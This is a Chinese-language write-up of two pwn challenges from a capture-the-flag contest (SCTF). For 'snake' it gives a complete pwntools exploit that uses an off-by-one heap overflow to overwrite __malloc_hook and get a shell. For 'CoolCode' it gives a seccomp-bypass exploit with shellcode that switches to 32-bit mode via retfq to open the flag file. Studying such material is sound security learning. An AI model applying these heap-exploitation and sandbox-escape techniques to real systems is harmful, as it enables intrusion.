# SCTF-WP


君子色而不淫，发乎情，止乎礼。						——《诗经》

<!--more-->

## snake

题目漏洞很简单，如果蛇死亡后的坐标在最右下角的话，那么死后留下的message将会有一个off by one漏洞，有了这个漏洞就不多说了，后面就都是套路了。

````python
from pwn import *
if args['REMOTE']:
	sh=remote('39.107.244.116',9999)
else:
	sh=process('./snake')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
gdba	= lambda command=''			:gdb.attach(sh,command)

def choice(elect):
	sh.recvuntil('4.start name')
	sh.sendline(str(elect))

def add(index,size,content):
	choice(1)
	sh.recvuntil('?')
	sh.sendline(str(index))
	ru('?')
	sl(str(size))
	ru('?')
	sl(content)

def get(index):
	choice(3)
	sh.recvuntil('?')
	sh.sendline(str(index))

def delete(index):
	choice(2)
	sh.recvuntil('?')
	sh.sendline(str(index))

def start():
	choice(4)

def down_to_end():
	for i in range(35):
		sl('')

def leave_words(words):
	ru('words:')
	if len(words)==0x4d:
		s(words)
	else:
		sl(words)
	ru('?')
	sl('n')
libc=ELF('../libc-2.23.so')
#begin
ru('?')
sl(str(0x30))
ru('name')
sl('a')
sl('')
down_to_end()
leave_words('a')
add(1,0x60,'a')
add(2,0x10,'b')
start()
down_to_end()
#overflow
leave_words('a'*0x4c+'\xb1')
delete(0)
add(0,0x10,'')
get(0)
start()
ru('name: ')
libc_base=u64(ru(' ').replace(' ','').ljust(8,'\x00'))-0x3c4c0a
info_addr('libc',libc_base)
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
gadget=[0x45216,0x4526a,0xf02a4,0xf1147] #3,5,7
onegadget=libc_base+gadget[3]
system=libc_base+libc.symbols['system']
free_hook=libc_base+libc.symbols['__free_hook']
setcontext=libc_base+libc.symbols['setcontext']
mprotect=libc_base+libc.symbols['mprotect']
info_addr('malloc_hook',malloc_hook)
info_addr('realloc',realloc)
info_addr('onegadget',onegadget)
info_addr('system',system)
info_addr('free_hook',free_hook)
info_addr('setcontext',setcontext)
down_to_end()
leave_words('a')
#get shell
delete(1)
add(1,0x40,p64(0)*3+p64(0x71)+p64(malloc_hook-0x23))
add(2,0x60,p64(0x604b70))
add(3,0x60,'\x00'*0xb+p64(onegadget)+p64(onegadget))
sh.interactive()
````

## CoolCode

这是一道考察shellcode编写的题目，刚好自己在这一部分比较薄弱，比赛中没有做出来，那么赛后就用这道题来学习一下shellcode编写方面的知识。

CTF中shellcode的编写最简单的就是没有限制任何系统调用，因此可以直接使用execve()来获得shell。

难一点的题目，会禁止execve()的调用，这个时候就可以通过ORW来获得flag。

更难一点的题目会对输入字符限制，比如限定在可打印字符范围内，再折磨人一点的话，会将其限定在字母和数字之中。而这个时候编写shellcode就需要很多技巧了，比如syscall不能使用，我们可以利用xor sub and inc dec这些运算操作动态的修改我们的shellcode。

最难的是什么呢，就是既限定了输入字符的范围，还禁止掉了open系统调用，这个时候我们常规的orw就无法使用了，这道题目就属于这个类型。

我们用seccomp查看一下可以使用哪些syscall。

````bash
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0006
 0002: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0006
 0003: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0006
 0004: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0006
 0005: 0x06 0x00 0x00 0x00050005  return ERRNO(5)
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
````

可以看到open函数没有在允许的调用中，其中出现了一个奇怪的调用函数，fstat，这个究竟有什么用呢？如果比较一下64位下的fstat和32位下的open，你会发现他们俩的系统调用号是一样的。如果我们可以转换到32位，那不就可以使用open函数了吗？如何从64位转换到32位呢？这里就需要用到一条汇编指令retqf。程序究竟是64位还是32位是看cs寄存器的值，如果cs寄存器的值是0x23那么就是32位，如果是0x33，那么就是64位。retqf语句等于ret ；pop cs；所以其会将[rsp+8]处的值赋值给cs。因此我们就可以利用这条语句来修改程序的位数。

这道题因为可以将exit函数修改为ret，所以可以bypass掉字符限制。如果不修改exit的话，那么就需要用mmap来分配一个在字符限制内的地址。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process('./CoolCode')

# if args['I386']:
# 	context.arch='i386'
# else:
# 	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'
context.os='linux'
def choice(elect):
	ru(':')
	sl(str(elect))

def add(index,message):
	choice(1)
	ru(':')
	sl(str(index))
	ru(':')
	s(message)

def show(index):
	choice(2)
	ru(':')
	sl(str(index))

def delete(index):
	choice(3)
	ru(':')
	sl(str(index))
#debug('b*0x0000000000400850\nc')
bss=0x602200	
add(-22,'\xc3')
read='''
xor eax,eax
xor edi,edi
mov rsi,0x01010101
xor rsi,0x1612301
push 0x01010101
pop rdx
syscall
mov rsp,rsi
retfq
'''
print len(asm(read,arch='amd64'))
open_flag='''
mov esp,0x602300
push 0x6761
push 0x6c662f2e
mov eax,5
mov ebx,esp
xor ecx,ecx
int 0x80
'''
read_write='''
push 0x33
push 0x602233
retfq
mov rdi,3
mov rsi,rsp
mov rdx,0x100
xor rax,rax
syscall 

mov rdi,1
mov rax,1
syscall
'''
add(-37,asm(read,arch='amd64'))
delete(0)
s(p64(0x602210)+p64(0x23)+asm(open_flag,arch='i386')+asm(read_write,arch='amd64'))
itr()
````

### reference

[shellcode 的艺术](https://xz.aliyun.com/t/6645#toc-3)

[SCTF 2020 PWN](https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/)


